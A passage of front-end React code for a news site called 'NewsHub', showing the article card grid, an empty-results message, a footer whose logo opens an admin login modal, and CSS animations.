                      </div>
                    )}
                  </div>
                </div>
              </section>
            )}

            <div style={styles.newsGrid}>
              {regularArticles.map(article => (
                <div
                  key={article.id}
                  style={styles.newsCard}
                  onMouseEnter={handleCardHover}
                  onMouseLeave={handleCardLeave}
                  onClick={() => article.url && window.open(article.url, '_blank')}
                >
                  <img 
                    src={article.image} 
                    alt={article.title}
                    style={styles.newsImage}
                  />
                  <div style={styles.newsContent}>
                    <div style={styles.categoryTag}>{article.category}</div>
                    <h3 style={styles.newsTitle}>{article.title}</h3>
                    <p style={styles.newsSummary}>{article.summary}</p>
                    <div style={styles.articleMeta}>
                      <span>By {article.author}</span>
                      <span>{article.readTime}</span>
                    </div>
                    <div style={{...styles.articleMeta, marginTop: '0.5rem'}}>
                      <span>{formatDate(article.publishedAt)}</span>
                      {article.source && <span>• {article.source}</span>}
                    </div>
                  </div>
                </div>
              ))}
            </div>

            {regularArticles.length === 0 && !loading && (
              <div style={styles.loadingContainer}>
                <p>No articles found. Try a different category or search term.</p>
              </div>
            )}
          </>
        )}
      </main>

      <footer style={styles.footer}>
        <div style={styles.footerContent}>
          {!isAdmin && !showAdminLogin && (
            <div 
              style={{...styles.logo, cursor: 'pointer'}}
              onClick={() => setShowAdminLogin(true)}
              title="Admin Access"
            >
              NewsHub
            </div>
          )}
          {(isAdmin || showAdminLogin) && (
            <div style={styles.logo}>NewsHub</div>
          )}
          <p style={styles.footerText}>
            Your trusted source for breaking news and in-depth analysis
          </p>
          <p style={{...styles.footerText, marginTop: '1rem'}}>
            © 2024 NewsHub. All rights reserved.
          </p>
        </div>
      </footer>

      <AdminLoginModal />
      <AdminPanel />
      
      {/* Add CSS animations */}
      <style jsx>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        @keyframes modalFadeIn {
          from { opacity: 0; transform: scale(0.9); }
          to { opacity: 1; transform: scale(1); }
        }
      `}</style>
    </div>
  );
};

export default NewsWebsite;